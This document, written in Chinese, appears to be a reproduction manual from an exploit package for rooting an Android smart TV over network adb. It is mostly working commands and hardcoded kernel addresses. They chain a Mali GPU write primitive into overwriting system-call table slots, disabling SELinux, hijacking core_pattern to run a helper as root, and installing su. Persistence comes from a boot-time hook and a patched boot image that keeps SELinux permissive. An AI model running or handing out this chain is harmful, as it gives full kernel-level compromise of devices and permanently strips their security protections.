# 02 复刻手册：从零到持久化 root

> 环境假设：Windows 10/11 + Git Bash（MSYS）；电视与 PC 同网段；adb 网络调试已在电视设置中开启（本机默认 192.168.2.105:5555）。
> 工具准备：本包 `tools/adb/platform-tools`（adb）、Android NDK r21e（下载：https://dl.google.com/android/repository/android-ndk-r21e-windows-x86_64.zip ，解压到 `tools/android-ndk-r21e`）、Python 3 + `pip install pyelftools capstone fdt`。
>
> **重要环境变量**：所有 adb 调用前 `export TEMP/TMP` 指到可写目录（见坑 #1）：
> ```bash
> export MSYS_NO_PATHCONV=1 TEMP="$PWD/tools/tmp" TMP="$PWD/tools/tmp"
> A="$PWD/tools/platform-tools/adb.exe"
> ```

---

## 阶段 0：环境与采证（30 分钟）

```bash
$A devices                                    # 应显示 192.168.2.105:5555 device
$A -s 192.168.2.105:5555 shell "cat /proc/kallsyms | wc -l"   # 应 91624 行
$A -s 192.168.2.105:5555 shell "cat /proc/kallsyms" > evidence/device_kallsyms.txt
$A -s 192.168.2.105:5555 shell "uname -a; getprop ro.build.version.incremental"   # 3.14.29-g4f3e19b / 1275
$A -s 192.168.2.105:5555 shell "ls -l /dev/mali"               # 应 0666
```

确认设备是同一机型/构建再继续（`04-设备事实与常量.md` 的指纹表）。不同构建的常量必须用 §3 重新扫出。

## 阶段 1：编译工具（10 分钟）

```bash
export NDK="$PWD/tools/android-ndk-r21e/toolchains/llvm/prebuilt/windows-x86_64"
CC="$NDK/bin/clang.exe"
SYS="--sysroot=$NDK/sysroot"

# 写原语（arm 32 静态）—— 注意用 tools/src 下已合并的补丁版（VA 分离版）
$CC --target=armv7a-linux-androideabi23 $SYS -O1 -static -o gpu_arb_write tools/src/gpu_arb_write.c
# 内核调用器（aarch64 静态，SLOT=246）
$CC --target=aarch64-linux-android23 $SYS -O1 -static -o kfunc246 tools/src/kfunc.c
# su（arm 32 静态）
$CC --target=armv7a-linux-androideabi23 $SYS -O1 -static -o mini_su tools/src/mini_su.c
# 读原语工具（需要先抓真实作业，见阶段 2）
$CC --target=armv7a-linux-androideabi23 $SYS -O1 -static -o replay tools/src/replay.c
$CC --target=armv7a-linux-androideabi23 $SYS -O1 -static -o gpu_scan tools/src/gpu_scan.c

$A -s 192.168.2.105:5555 push gpu_arb_write kfunc246 mini_su /data/local/tmp/
$A -s 192.168.2.105:5555 shell "chmod 755 /data/local/tmp/*"
```

（懒人路径：`tools/bin/` 里有全部编译好的二进制，直接 push 即可。）

## 阶段 2：抓真实 DDK 作业（只做一次，产物已附在 evidence/）

如果直接用 `evidence/kallsyms/win1.bin + win2.bin + capture3/real_pp_job_003.bin`，可跳过本阶段。

1. 编译 hook + probe（`build.sh`，产物 hook.so/gles_probe），push 后运行：
   ```bash
   $A shell "LD_PRELOAD=/data/local/tmp/hook.so /data/local/tmp/gles_probe"
   ```
   它会在 `/data/local/tmp/jobs/` 生成：真实 GP/PP job、mali 窗口转储（mregion_*）、纹理窗口（0x10040000）。
2. pull 回 `b1/capture5/`，确认有 `real_pp_job_003.bin`（408B）、`win1.bin`(0x40000)、`win2.bin`(0x4000)。

## 阶段 3：读原语验证（5 分钟）

```bash
$A push b1/replay tools/tmp/win1.bin tools/tmp/win2.bin tools/tmp/pp.bin /data/local/tmp/
# pp.bin = capture3/real_pp_job_003.bin（texld draw 的真实 job）
$A shell "/data/local/tmp/replay /data/local/tmp 2 1080000"
```
输出 1KB 里出现 `d5` 开头的 ARM64 MSR 指令特征 = **内核 .text 已被读出**，读原语成立。

主机侧密集读（Python，每块 16KB ≈ 2 秒）：
```bash
python tools/src/host_dense.py <start_phys_hex> <end_phys_hex> <outdir>
# 产物 outdir/full.bin = 该物理区间的完整明文镜像（已做字节重排与缺口检测）
```

## 阶段 4：定位常量（一次性，常量已给出）

新固件/新设备才需要：
1. `host_dense.py` 密集扫 `_text` 起全内核镜像；
2. 找升序指针数组 = `kallsyms_addresses`（首项 = _text VA）；
3. `python tools/src/decode_kallsyms.py` 重建符号表（names 从 0x1b8a200、token 表 0x1c82d00，偏移脚本内可调）；
4. 与 `evidence/device_kallsyms.txt` 逐条验证 0 mismatch。
5. 拿到 5 个关键常量：kallsyms_lookup_name / sys_call_table / memcpy / selinux_enforcing / core_pattern。

## 阶段 5：提权（10 分钟）

```bash
# 5.1 写原语自校准
$A shell "/data/local/tmp/gpu_arb_write 0 0"                       # 应输出 OK
# 5.2 sys_call_table[246..259] ← memcpy（128B 写，一枪 16 槽）
$A shell "/data/local/tmp/gpu_arb_write 1f2b790 ffffffc0013e4400"
# 5.3 关 SELinux
$A shell "/data/local/tmp/kfunc246 zero ffffffc00211f77c 4; getenforce"    # → Permissive
# 5.4 劫持 core_pattern
$A shell "/data/local/tmp/kfunc246 str ffffffc001f613c8 '|/data/local/tmp/roothelper.sh'"
# 5.5 安装 su
$A push tools/bin/mini_su /data/local/tmp/su
# 用 tools/device_scripts/fixsu.sh 作为 roothelper（含 root_cmd.sh 执行器）
$A push tools/device_scripts/fixsu.sh /data/local/tmp/roothelper.sh
$A push tools/device_scripts/root_cmd.sh /data/local/tmp/root_cmd.sh
$A shell "chmod 755 /data/local/tmp/roothelper.sh"
# 5.6 触发 coredump → roothelper 以 kernel:s0 全 caps 执行
$A shell "ulimit -c unlimited; kill -SEGV \$\$"     # 会话会断，正常
# 5.7 验证
$A shell "su -c id"                                  # → uid=0(root)
$A shell "su -c 'cp /data/local/tmp/su /system/xbin/su; chmod 6755 /system/xbin/su'"   # 若提示权限不足改用 root_cmd.sh 方式（见坑 #9）
```

## 阶段 6：持久化

### 6.1 开机钩子（恢复 slots + adb 端口）
```bash
$A push tools/device_scripts/rootify.sh /data/local/tmp/rootify.sh
$A shell "su -c 'cp /data/local/tmp/rootify.sh /system/bin/rootify.sh; chmod 755 /system/bin/rootify.sh'"
$A shell "su -c 'echo \"( /system/bin/rootify.sh ) &\" >> /system/bin/install-recovery.sh'"
```
（若 su 报权限不足，把这几条写进 root_cmd.sh 走 roothelper 通道。）

### 6.2 内核补丁（SELinux 永久 Permissive，根基）
```bash
# 备份原厂 boot
$A exec-out "su -c 'dd if=/dev/block/boot'" > images/boot_backup.img
# 打补丁：boot.img 内核(gzip) 中 sel_write_enforce(phys 0x1385f08) → 00008052 c0035fd6
# 参考本包根目录脚本 tools/src/patch_boot.py（见下）验证 diff=7 字节后刷写
$A push images/boot_patched.img /data/local/tmp/
$A shell "su -c 'dd if=/data/local/tmp/boot_patched.img of=/dev/block/boot && sync'"
$A shell "su -c reboot"
# 重启后验证
$A shell "getenforce; su -c id"     # Permissive + uid=0 即持久化成功
```

补丁生成逻辑（已验证，见 `tools/src/patch_boot.py`）：
1. boot.img 头 2048 字节 + gzip 内核（`1f 8b`）；
2. 解压得 Image，文件偏移 = `0x1385f08 - 0x1080000`（= 0x305f08）处写 8 字节 `00 00 80 52 c0 03 5f d6`；
3. 重新 gzip，按 bootimg 布局重排（kernel_size 字段同步更新），ramdisk/second 原样搬运；
4. 全量 diff 校验：与原 Image 仅 7 字节差异 → 刷入。

## 阶段 7：日常使用

```bash
$A shell "su -c '<任意命令>'"        # uid=0；写 shell 目录会失败（caps 限制）
# 全权 root 操作（写 /system、dd、chmod 他人文件）：
#   1. 把命令写进 /data/local/tmp/root_cmd.sh（adb push 覆盖）
#   2. $A shell "ulimit -c unlimited; kill -SEGV \$\$"   触发 coredump
#   3. 结果看 /data/local/tmp/root.log
```

**重启后须知**：内核态（slots/core_pattern）归零，但 L1 补丁保证 Permissive、L2 rootify 恢复 slots+adb。若某次开机 rootify 没跑成，按阶段 5 的 5.2~5.4 手动重跑（30 秒）。
